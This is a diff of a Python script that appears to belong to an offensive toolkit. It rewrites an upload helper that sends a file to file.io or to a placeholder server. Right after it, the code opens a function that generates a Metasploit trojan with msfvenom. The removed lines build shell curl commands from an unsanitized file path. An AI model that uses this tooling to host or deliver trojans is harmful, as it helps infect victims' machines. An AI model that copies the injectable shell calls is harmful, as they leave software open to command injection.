@@ -121,26 +121,38 @@ def upload_file(file):
     prints(f'''
 {sara} : do you want to upload \'{g}{file}{w}\' ?
          
-         (1) yes, i want to upload
+         (1) yes, I want to upload
          (2) no thanks
     ''')
     asks = str(input(f'{user} : '))
-    if asks in ('2', '02'): return False
-    text = f'{sara} : upload \'{d}{file}{w}\' into the link ...'
+    if asks in ('2', '02'):
+        return False
+
+    # Change the following variables to match your web server configuration
+    upload_url = "http://your-server/upload.php"  # Replace with your server URL
+    file_field_name = "file"  # Replace with the field name used for file uploads in your form
+
+    files = {file_field_name: (os.path.basename(file), open(file, "rb"))}
+
+    text = f'{sara} : uploading \'{d}{file}{w}\' to your server ... '
     print(text + f'{y}wait{w}', end='\r')
-    link = os.popen(f'curl --upload-file {file} http://127.0.0.1:5000/{os.path.basename(file)} --silent', 'r').readline().strip()
-    if 'https' not in link:
-        try:
-            link = re.search('"link":"(.*?)"', os.popen(f'curl -F "file=@{file}" https://file.io --silent','r').read()).group(1)
-        except:
-            print(text + f'{r}fail{w}')
-            return False
-    print(text + f'{g}done{w}')
-    prints(f'''
+
+    try:
+        response = requests.post(upload_url, files=files)
+        if response.status_code == 200:
+            download_link = response.text.strip()
+            print(text + f'{g}done{w}')
+            prints(f'''
 {sara} : your file has been successfully uploaded,
          here is the download link ...
          
-         {y}{link}{w}''')
+         {y}{download_link}{w}''')
+        else:
+            print(text + f'{r}fail{w}')
+    except Exception as e:
+        print(text + f'{r}fail{w} - {e}')
+
+    return True
 # generate raw trojan using msfvenom (metasploit)
 def generate_trojan(host, port, name = None):
     if name == None: name = 'trojan'
